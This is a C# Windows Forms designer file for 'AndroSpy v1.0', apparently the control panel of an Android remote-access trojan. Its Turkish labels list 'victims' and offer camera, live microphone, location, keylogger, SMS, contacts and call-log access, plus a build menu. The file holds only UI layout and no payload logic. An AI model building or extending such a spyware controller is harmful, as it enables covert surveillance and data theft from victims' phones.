namespace SV
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.listView1 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.mesajYollaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.bağlantıyıKapatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.masaustuİzleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.canlıMikrofonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.konumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.eğlencePaneliToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sMSYöneticisiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rehberToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.çağrıKayıtlarıToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.telefonAyarlarıToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uygulamaListesiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.telefonDurumuToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ımageList1 = new System.Windows.Forms.ImageList(this.components);
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.oluşturToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ayarlarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hakkındaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip1.SuspendLayout();
            this.menuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // listView1
            // 
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4,
            this.columnHeader5,
            this.columnHeader6});
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.listView1.FullRowSelect = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(0, 27);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(805, 277);
            this.listView1.SmallImageList = this.ımageList1;
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Soket ID";
            this.columnHeader1.Width = 75;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Kurban İsmi";
            this.columnHeader2.Width = 150;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "IP Adresi";
            this.columnHeader3.Width = 150;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Ülke/Dil";
            this.columnHeader4.Width = 150;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Marka/Model";
            this.columnHeader5.Width = 150;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "Android Versiyonu";
            this.columnHeader6.Width = 100;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.mesajYollaToolStripMenuItem,
            this.bağlantıyıKapatToolStripMenuItem,
            this.masaustuİzleToolStripMenuItem,
            this.canlıMikrofonToolStripMenuItem,
            this.konumToolStripMenuItem,
            this.keyloggerToolStripMenuItem,
            this.eğlencePaneliToolStripMenuItem,
            this.sMSYöneticisiToolStripMenuItem,
            this.rehberToolStripMenuItem,
            this.çağrıKayıtlarıToolStripMenuItem,
            this.telefonAyarlarıToolStripMenuItem,
            this.uygulamaListesiToolStripMenuItem,
            this.telefonDurumuToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(164, 290);
            this.contextMenuStrip1.Text = "Konum";
            // 
            // mesajYollaToolStripMenuItem
            // 
            this.mesajYollaToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mesajYollaToolStripMenuItem.Image")));
            this.mesajYollaToolStripMenuItem.Name = "mesajYollaToolStripMenuItem";
            this.mesajYollaToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
            this.mesajYollaToolStripMenuItem.Text = "Kamera";
            this.mesajYollaToolStripMenuItem.Click += new System.EventHandler(this.mesajYollaToolStripMenuItem_Click);
            // 
            // bağlantıyıKapatToolStripMenuItem
            // 
            this.bağlantıyıKapatToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("bağlantıyıKapatToolStripMenuItem.Image")));
            this.bağlantıyıKapatToolStripMenuItem.Name = "bağlantıyıKapatToolStripMenuItem";
            this.bağlantıyıKapatToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
            this.bağlantıyıKapatToolStripMenuItem.Text = "Dosya Yöneticisi";
            this.bağlantıyıKapatToolStripMenuItem.Click += new System.EventHandler(this.bağlantıyıKapatToolStripMenuItem_Click);
            // 
            // masaustuİzleToolStripMenuItem
            // 
            this.masaustuİzleToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("masaustuİzleToolStripMenuItem.Image")));
            this.masaustuİzleToolStripMenuItem.Name = "masaustuİzleToolStripMenuItem";
            this.masaustuİzleToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
            this.masaustuİzleToolStripMenuItem.Text = "Telefon";
            this.masaustuİzleToolStripMenuItem.Click += new System.EventHandler(this.masaustuİzleToolStripMenuItem_Click);
            // 
            // canlıMikrofonToolStripMenuItem
            // 
            this.canlıMikrofonToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("canlıMikrofonToolStripMenuItem.Image")));
            this.canlıMikrofonToolStripMenuItem.Name = "canlıMikrofonToolStripMenuItem";
            this.canlıMikrofonToolStripMenuItem.Size = new System.Drawing.Size(163, 22);
            this.canlıMikrofonToolStripMenuItem.Text = "Canlı Mikrofon";
            this.canlıMikrofonToolStripMenuItem.Click += new System.EventHandler(this.canlıMikrofonToolStripMenuItem_Click);
            // 
            // konumToolStripMenuItem
            // 
            this.konumToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("konumToolStripMenuItem.Image")));
            this.konumToolStripMenuItem.Name = "konumToolStripMenuItem";
            this.konumToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.konumToolStripMenuItem.Text = "Konum";
            this.konumToolStripMenuItem.Click += new System.EventHandler(this.konumToolStripMenuItem_Click);
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("keyloggerToolStripMenuItem.Image")));
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger";
            this.keyloggerToolStripMenuItem.Click += new System.EventHandler(this.keyloggerToolStripMenuItem_Click);
            // 
            // eğlencePaneliToolStripMenuItem
            // 
            this.eğlencePaneliToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("eğlencePaneliToolStripMenuItem.Image")));
            this.eğlencePaneliToolStripMenuItem.Name = "eğlencePaneliToolStripMenuItem";
            this.eğlencePaneliToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.eğlencePaneliToolStripMenuItem.Text = "Eğlence Paneli";
            this.eğlencePaneliToolStripMenuItem.Click += new System.EventHandler(this.eğlencePaneliToolStripMenuItem_Click);
            // 
            // sMSYöneticisiToolStripMenuItem
            // 
            this.sMSYöneticisiToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("sMSYöneticisiToolStripMenuItem.Image")));
            this.sMSYöneticisiToolStripMenuItem.Name = "sMSYöneticisiToolStripMenuItem";
            this.sMSYöneticisiToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.sMSYöneticisiToolStripMenuItem.Text = "SMS Yöneticisi";
            this.sMSYöneticisiToolStripMenuItem.Click += new System.EventHandler(this.sMSYöneticisiToolStripMenuItem_Click);
            // 
            // rehberToolStripMenuItem
            // 
            this.rehberToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("rehberToolStripMenuItem.Image")));
            this.rehberToolStripMenuItem.Name = "rehberToolStripMenuItem";
            this.rehberToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.rehberToolStripMenuItem.Text = "Rehber";
            this.rehberToolStripMenuItem.Click += new System.EventHandler(this.rehberToolStripMenuItem_Click);
            // 
            // çağrıKayıtlarıToolStripMenuItem
            // 
            this.çağrıKayıtlarıToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("çağrıKayıtlarıToolStripMenuItem.Image")));
            this.çağrıKayıtlarıToolStripMenuItem.Name = "çağrıKayıtlarıToolStripMenuItem";
            this.çağrıKayıtlarıToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.çağrıKayıtlarıToolStripMenuItem.Text = "Çağrı Kayıtları";
            this.çağrıKayıtlarıToolStripMenuItem.Click += new System.EventHandler(this.çağrıKayıtlarıToolStripMenuItem_Click);
            // 
            // telefonAyarlarıToolStripMenuItem
            // 
            this.telefonAyarlarıToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("telefonAyarlarıToolStripMenuItem.Image")));
            this.telefonAyarlarıToolStripMenuItem.Name = "telefonAyarlarıToolStripMenuItem";
            this.telefonAyarlarıToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.telefonAyarlarıToolStripMenuItem.Text = "Telefon Ayarları";
            this.telefonAyarlarıToolStripMenuItem.Click += new System.EventHandler(this.telefonAyarlarıToolStripMenuItem_Click);
            // 
            // uygulamaListesiToolStripMenuItem
            // 
            this.uygulamaListesiToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uygulamaListesiToolStripMenuItem.Image")));
            this.uygulamaListesiToolStripMenuItem.Name = "uygulamaListesiToolStripMenuItem";
            this.uygulamaListesiToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.uygulamaListesiToolStripMenuItem.Text = "Uygulama Listesi";
            this.uygulamaListesiToolStripMenuItem.Click += new System.EventHandler(this.uygulamaListesiToolStripMenuItem_Click);
            // 
            // telefonDurumuToolStripMenuItem
            // 
            this.telefonDurumuToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("telefonDurumuToolStripMenuItem.Image")));
            this.telefonDurumuToolStripMenuItem.Name = "telefonDurumuToolStripMenuItem";
            this.telefonDurumuToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.telefonDurumuToolStripMenuItem.Text = "Telefon Durumu";
            this.telefonDurumuToolStripMenuItem.Click += new System.EventHandler(this.telefonDurumuToolStripMenuItem_Click);
            // 
            // ımageList1
            // 
            this.ımageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("ımageList1.ImageStream")));
            this.ımageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.ımageList1.Images.SetKeyName(0, "-1.png");
            this.ımageList1.Images.SetKeyName(1, "ad.png");
            this.ımageList1.Images.SetKeyName(2, "ae.png");
            this.ımageList1.Images.SetKeyName(3, "af.png");
            this.ımageList1.Images.SetKeyName(4, "ag.png");
            this.ımageList1.Images.SetKeyName(5, "ai.png");
            this.ımageList1.Images.SetKeyName(6, "al.png");
            this.ımageList1.Images.SetKeyName(7, "am.png");
            this.ımageList1.Images.SetKeyName(8, "an.png");
            this.ımageList1.Images.SetKeyName(9, "ao.png");
            this.ımageList1.Images.SetKeyName(10, "ar.png");
            this.ımageList1.Images.SetKeyName(11, "as.png");
            this.ımageList1.Images.SetKeyName(12, "at.png");
            this.ımageList1.Images.SetKeyName(13, "au.png");
            this.ımageList1.Images.SetKeyName(14, "aw.png");
            this.ımageList1.Images.SetKeyName(15, "ax.png");
            this.ımageList1.Images.SetKeyName(16, "az.png");
            this.ımageList1.Images.SetKeyName(17, "ba.png");
            this.ımageList1.Images.SetKeyName(18, "bb.png");
            this.ımageList1.Images.SetKeyName(19, "bd.png");
            this.ımageList1.Images.SetKeyName(20, "be.png");
            this.ımageList1.Images.SetKeyName(21, "bf.png");
            this.ımageList1.Images.SetKeyName(22, "bg.png");
            this.ımageList1.Images.SetKeyName(23, "bh.png");
            this.ımageList1.Images.SetKeyName(24, "bi.png");
            this.ımageList1.Images.SetKeyName(25, "bj.png");
            this.ımageList1.Images.SetKeyName(26, "bm.png");
            this.ımageList1.Images.SetKeyName(27, "bn.png");
            this.ımageList1.Images.SetKeyName(28, "bo.png");
            this.ımageList1.Images.SetKeyName(29, "br.png");
            this.ımageList1.Images.SetKeyName(30, "bs.png");
            this.ımageList1.Images.SetKeyName(31, "bt.png");
            this.ımageList1.Images.SetKeyName(32, "bv.png");
            this.ımageList1.Images.SetKeyName(33, "bw.png");
            this.ımageList1.Images.SetKeyName(34, "by.png");
            this.ımageList1.Images.SetKeyName(35, "bz.png");
            this.ımageList1.Images.SetKeyName(36, "ca.png");
            this.ımageList1.Images.SetKeyName(37, "catalonia.png");
            this.ımageList1.Images.SetKeyName(38, "cc.png");
            this.ımageList1.Images.SetKeyName(39, "cd.png");
            this.ımageList1.Images.SetKeyName(40, "cf.png");
            this.ımageList1.Images.SetKeyName(41, "cg.png");
            this.ımageList1.Images.SetKeyName(42, "ch.png");
            this.ımageList1.Images.SetKeyName(43, "ci.png");
            this.ımageList1.Images.SetKeyName(44, "ck.png");
            this.ımageList1.Images.SetKeyName(45, "cl.png");
            this.ımageList1.Images.SetKeyName(46, "cm.png");
            this.ımageList1.Images.SetKeyName(47, "cn.png");
            this.ımageList1.Images.SetKeyName(48, "co.png");
            this.ımageList1.Images.SetKeyName(49, "cr.png");
            this.ımageList1.Images.SetKeyName(50, "cs.png");
            this.ımageList1.Images.SetKeyName(51, "cu.png");
            this.ımageList1.Images.SetKeyName(52, "cv.png");
            this.ımageList1.Images.SetKeyName(53, "cx.png");
            this.ımageList1.Images.SetKeyName(54, "cy.png");
            this.ımageList1.Images.SetKeyName(55, "cz.png");
            this.ımageList1.Images.SetKeyName(56, "de.png");
            this.ımageList1.Images.SetKeyName(57, "dj.png");
            this.ımageList1.Images.SetKeyName(58, "dk.png");
            this.ımageList1.Images.SetKeyName(59, "dm.png");
            this.ımageList1.Images.SetKeyName(60, "do.png");
            this.ımageList1.Images.SetKeyName(61, "dz.png");
            this.ımageList1.Images.SetKeyName(62, "ec.png");
            this.ımageList1.Images.SetKeyName(63, "ee.png");
            this.ımageList1.Images.SetKeyName(64, "eg.png");
            this.ımageList1.Images.SetKeyName(65, "eh.png");
            this.ımageList1.Images.SetKeyName(66, "england.png");
            this.ımageList1.Images.SetKeyName(67, "er.png");
            this.ımageList1.Images.SetKeyName(68, "es.png");
            this.ımageList1.Images.SetKeyName(69, "et.png");
            this.ımageList1.Images.SetKeyName(70, "europeanunion.png");
            this.ımageList1.Images.SetKeyName(71, "fam.png");
            this.ımageList1.Images.SetKeyName(72, "fi.png");
            this.ımageList1.Images.SetKeyName(73, "fj.png");
            this.ımageList1.Images.SetKeyName(74, "fk.png");
            this.ımageList1.Images.SetKeyName(75, "fm.png");
            this.ımageList1.Images.SetKeyName(76, "fo.png");
            this.ımageList1.Images.SetKeyName(77, "fr.png");
            this.ımageList1.Images.SetKeyName(78, "ga.png");
            this.ımageList1.Images.SetKeyName(79, "gb.png");
            this.ımageList1.Images.SetKeyName(80, "gd.png");
            this.ımageList1.Images.SetKeyName(81, "ge.png");
            this.ımageList1.Images.SetKeyName(82, "gf.png");
            this.ımageList1.Images.SetKeyName(83, "gh.png");
            this.ımageList1.Images.SetKeyName(84, "gi.png");
            this.ımageList1.Images.SetKeyName(85, "gl.png");
            this.ımageList1.Images.SetKeyName(86, "gm.png");
            this.ımageList1.Images.SetKeyName(87, "gn.png");
            this.ımageList1.Images.SetKeyName(88, "gp.png");
            this.ımageList1.Images.SetKeyName(89, "gq.png");
            this.ımageList1.Images.SetKeyName(90, "gr.png");
            this.ımageList1.Images.SetKeyName(91, "gs.png");
            this.ımageList1.Images.SetKeyName(92, "gt.png");
            this.ımageList1.Images.SetKeyName(93, "gu.png");
            this.ımageList1.Images.SetKeyName(94, "gw.png");
            this.ımageList1.Images.SetKeyName(95, "gy.png");
            this.ımageList1.Images.SetKeyName(96, "hk.png");
            this.ımageList1.Images.SetKeyName(97, "hm.png");
            this.ımageList1.Images.SetKeyName(98, "hn.png");
            this.ımageList1.Images.SetKeyName(99, "hr.png");
            this.ımageList1.Images.SetKeyName(100, "ht.png");
            this.ımageList1.Images.SetKeyName(101, "hu.png");
            this.ımageList1.Images.SetKeyName(102, "id.png");
            this.ımageList1.Images.SetKeyName(103, "ie.png");
            this.ımageList1.Images.SetKeyName(104, "il.png");
            this.ımageList1.Images.SetKeyName(105, "in.png");
            this.ımageList1.Images.SetKeyName(106, "io.png");
            this.ımageList1.Images.SetKeyName(107, "iq.png");
            this.ımageList1.Images.SetKeyName(108, "ir.png");
            this.ımageList1.Images.SetKeyName(109, "is.png");
            this.ımageList1.Images.SetKeyName(110, "it.png");
            this.ımageList1.Images.SetKeyName(111, "jm.png");
            this.ımageList1.Images.SetKeyName(112, "jo.png");
            this.ımageList1.Images.SetKeyName(113, "jp.png");
            this.ımageList1.Images.SetKeyName(114, "ke.png");
            this.ımageList1.Images.SetKeyName(115, "kg.png");
            this.ımageList1.Images.SetKeyName(116, "kh.png");
            this.ımageList1.Images.SetKeyName(117, "ki.png");
            this.ımageList1.Images.SetKeyName(118, "km.png");
            this.ımageList1.Images.SetKeyName(119, "kn.png");
            this.ımageList1.Images.SetKeyName(120, "kp.png");
            this.ımageList1.Images.SetKeyName(121, "kr.png");
            this.ımageList1.Images.SetKeyName(122, "kw.png");
            this.ımageList1.Images.SetKeyName(123, "ky.png");
            this.ımageList1.Images.SetKeyName(124, "kz.png");
            this.ımageList1.Images.SetKeyName(125, "la.png");
            this.ımageList1.Images.SetKeyName(126, "lb.png");
            this.ımageList1.Images.SetKeyName(127, "lc.png");
            this.ımageList1.Images.SetKeyName(128, "li.png");
            this.ımageList1.Images.SetKeyName(129, "lk.png");
            this.ımageList1.Images.SetKeyName(130, "lr.png");
            this.ımageList1.Images.SetKeyName(131, "ls.png");
            this.ımageList1.Images.SetKeyName(132, "lt.png");
            this.ımageList1.Images.SetKeyName(133, "lu.png");
            this.ımageList1.Images.SetKeyName(134, "lv.png");
            this.ımageList1.Images.SetKeyName(135, "ly.png");
            this.ımageList1.Images.SetKeyName(136, "ma.png");
            this.ımageList1.Images.SetKeyName(137, "mc.png");
            this.ımageList1.Images.SetKeyName(138, "md.png");
            this.ımageList1.Images.SetKeyName(139, "me.png");
            this.ımageList1.Images.SetKeyName(140, "mg.png");
            this.ımageList1.Images.SetKeyName(141, "mh.png");
            this.ımageList1.Images.SetKeyName(142, "mk.png");
            this.ımageList1.Images.SetKeyName(143, "ml.png");
            this.ımageList1.Images.SetKeyName(144, "mm.png");
            this.ımageList1.Images.SetKeyName(145, "mn.png");
            this.ımageList1.Images.SetKeyName(146, "mo.png");
            this.ımageList1.Images.SetKeyName(147, "mp.png");
            this.ımageList1.Images.SetKeyName(148, "mq.png");
            this.ımageList1.Images.SetKeyName(149, "mr.png");
            this.ımageList1.Images.SetKeyName(150, "ms.png");
            this.ımageList1.Images.SetKeyName(151, "mt.png");
            this.ımageList1.Images.SetKeyName(152, "mu.png");
            this.ımageList1.Images.SetKeyName(153, "mv.png");
            this.ımageList1.Images.SetKeyName(154, "mw.png");
            this.ımageList1.Images.SetKeyName(155, "mx.png");
            this.ımageList1.Images.SetKeyName(156, "my.png");
            this.ımageList1.Images.SetKeyName(157, "mz.png");
            this.ımageList1.Images.SetKeyName(158, "na.png");
            this.ımageList1.Images.SetKeyName(159, "nc.png");
            this.ımageList1.Images.SetKeyName(160, "ne.png");
            this.ımageList1.Images.SetKeyName(161, "nf.png");
            this.ımageList1.Images.SetKeyName(162, "ng.png");
            this.ımageList1.Images.SetKeyName(163, "ni.png");
            this.ımageList1.Images.SetKeyName(164, "nl.png");
            this.ımageList1.Images.SetKeyName(165, "no.png");
            this.ımageList1.Images.SetKeyName(166, "np.png");
            this.ımageList1.Images.SetKeyName(167, "nr.png");
            this.ımageList1.Images.SetKeyName(168, "nu.png");
            this.ımageList1.Images.SetKeyName(169, "nz.png");
            this.ımageList1.Images.SetKeyName(170, "om.png");
            this.ımageList1.Images.SetKeyName(171, "pa.png");
            this.ımageList1.Images.SetKeyName(172, "pe.png");
            this.ımageList1.Images.SetKeyName(173, "pf.png");
            this.ımageList1.Images.SetKeyName(174, "pg.png");
            this.ımageList1.Images.SetKeyName(175, "ph.png");
            this.ımageList1.Images.SetKeyName(176, "pk.png");
            this.ımageList1.Images.SetKeyName(177, "pl.png");
            this.ımageList1.Images.SetKeyName(178, "pm.png");
            this.ımageList1.Images.SetKeyName(179, "pn.png");
            this.ımageList1.Images.SetKeyName(180, "pr.png");
            this.ımageList1.Images.SetKeyName(181, "ps.png");
            this.ımageList1.Images.SetKeyName(182, "pt.png");
            this.ımageList1.Images.SetKeyName(183, "pw.png");
            this.ımageList1.Images.SetKeyName(184, "py.png");
            this.ımageList1.Images.SetKeyName(185, "qa.png");
            this.ımageList1.Images.SetKeyName(186, "re.png");
            this.ımageList1.Images.SetKeyName(187, "ro.png");
            this.ımageList1.Images.SetKeyName(188, "rs.png");
            this.ımageList1.Images.SetKeyName(189, "ru.png");
            this.ımageList1.Images.SetKeyName(190, "rw.png");
            this.ımageList1.Images.SetKeyName(191, "sa.png");
            this.ımageList1.Images.SetKeyName(192, "sb.png");
            this.ımageList1.Images.SetKeyName(193, "sc.png");
            this.ımageList1.Images.SetKeyName(194, "scotland.png");
            this.ımageList1.Images.SetKeyName(195, "sd.png");
            this.ımageList1.Images.SetKeyName(196, "se.png");
            this.ımageList1.Images.SetKeyName(197, "sg.png");
            this.ımageList1.Images.SetKeyName(198, "sh.png");
            this.ımageList1.Images.SetKeyName(199, "si.png");
            this.ımageList1.Images.SetKeyName(200, "sj.png");
            this.ımageList1.Images.SetKeyName(201, "sk.png");
            this.ımageList1.Images.SetKeyName(202, "sl.png");
            this.ımageList1.Images.SetKeyName(203, "sm.png");
            this.ımageList1.Images.SetKeyName(204, "sn.png");
            this.ımageList1.Images.SetKeyName(205, "so.png");
            this.ımageList1.Images.SetKeyName(206, "sr.png");
            this.ımageList1.Images.SetKeyName(207, "st.png");
            this.ımageList1.Images.SetKeyName(208, "sv.png");
            this.ımageList1.Images.SetKeyName(209, "sy.png");
            this.ımageList1.Images.SetKeyName(210, "sz.png");
            this.ımageList1.Images.SetKeyName(211, "tc.png");
            this.ımageList1.Images.SetKeyName(212, "td.png");
            this.ımageList1.Images.SetKeyName(213, "tf.png");
            this.ımageList1.Images.SetKeyName(214, "tg.png");
            this.ımageList1.Images.SetKeyName(215, "th.png");
            this.ımageList1.Images.SetKeyName(216, "tj.png");
            this.ımageList1.Images.SetKeyName(217, "tk.png");
            this.ımageList1.Images.SetKeyName(218, "tl.png");
            this.ımageList1.Images.SetKeyName(219, "tm.png");
            this.ımageList1.Images.SetKeyName(220, "tn.png");
            this.ımageList1.Images.SetKeyName(221, "to.png");
            this.ımageList1.Images.SetKeyName(222, "tr.png");
            this.ımageList1.Images.SetKeyName(223, "tt.png");
            this.ımageList1.Images.SetKeyName(224, "tv.png");
            this.ımageList1.Images.SetKeyName(225, "tw.png");
            this.ımageList1.Images.SetKeyName(226, "tz.png");
            this.ımageList1.Images.SetKeyName(227, "ua.png");
            this.ımageList1.Images.SetKeyName(228, "ug.png");
            this.ımageList1.Images.SetKeyName(229, "um.png");
            this.ımageList1.Images.SetKeyName(230, "us.png");
            this.ımageList1.Images.SetKeyName(231, "uy.png");
            this.ımageList1.Images.SetKeyName(232, "uz.png");
            this.ımageList1.Images.SetKeyName(233, "va.png");
            this.ımageList1.Images.SetKeyName(234, "vc.png");
            this.ımageList1.Images.SetKeyName(235, "ve.png");
            this.ımageList1.Images.SetKeyName(236, "vg.png");
            this.ımageList1.Images.SetKeyName(237, "vi.png");
            this.ımageList1.Images.SetKeyName(238, "vn.png");
            this.ımageList1.Images.SetKeyName(239, "vu.png");
            this.ımageList1.Images.SetKeyName(240, "wales.png");
            this.ımageList1.Images.SetKeyName(241, "wf.png");
            this.ımageList1.Images.SetKeyName(242, "ws.png");
            this.ımageList1.Images.SetKeyName(243, "ye.png");
            this.ımageList1.Images.SetKeyName(244, "yt.png");
            this.ımageList1.Images.SetKeyName(245, "za.png");
            this.ımageList1.Images.SetKeyName(246, "zm.png");
            this.ımageList1.Images.SetKeyName(247, "zw.png");
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 1000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // menuStrip1
            // 
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.oluşturToolStripMenuItem,
            this.ayarlarToolStripMenuItem,
            this.hakkındaToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Size = new System.Drawing.Size(805, 24);
            this.menuStrip1.TabIndex = 1;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // oluşturToolStripMenuItem
            // 
            this.oluşturToolStripMenuItem.Name = "oluşturToolStripMenuItem";
            this.oluşturToolStripMenuItem.Size = new System.Drawing.Size(58, 20);
            this.oluşturToolStripMenuItem.Text = "Oluştur";
            this.oluşturToolStripMenuItem.Click += new System.EventHandler(this.oluşturToolStripMenuItem_Click);
            // 
            // ayarlarToolStripMenuItem
            // 
            this.ayarlarToolStripMenuItem.Name = "ayarlarToolStripMenuItem";
            this.ayarlarToolStripMenuItem.Size = new System.Drawing.Size(56, 20);
            this.ayarlarToolStripMenuItem.Text = "Ayarlar";
            // 
            // hakkındaToolStripMenuItem
            // 
            this.hakkındaToolStripMenuItem.Name = "hakkındaToolStripMenuItem";
            this.hakkındaToolStripMenuItem.Size = new System.Drawing.Size(69, 20);
            this.hakkındaToolStripMenuItem.Text = "Hakkında";
            this.hakkındaToolStripMenuItem.Click += new System.EventHandler(this.hakkındaToolStripMenuItem_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(805, 304);
            this.Controls.Add(this.menuStrip1);
            this.Controls.Add(this.listView1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.menuStrip1;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "AndroSpy v1.0 | By Sagopa K";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.contextMenuStrip1.ResumeLayout(false);
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem mesajYollaToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.ToolStripMenuItem bağlantıyıKapatToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem masaustuİzleToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem canlıMikrofonToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem konumToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem eğlencePaneliToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ColumnHeader columnHeader5;
        private System.Windows.Forms.ColumnHeader columnHeader6;
        private System.Windows.Forms.ToolStripMenuItem sMSYöneticisiToolStripMenuItem;
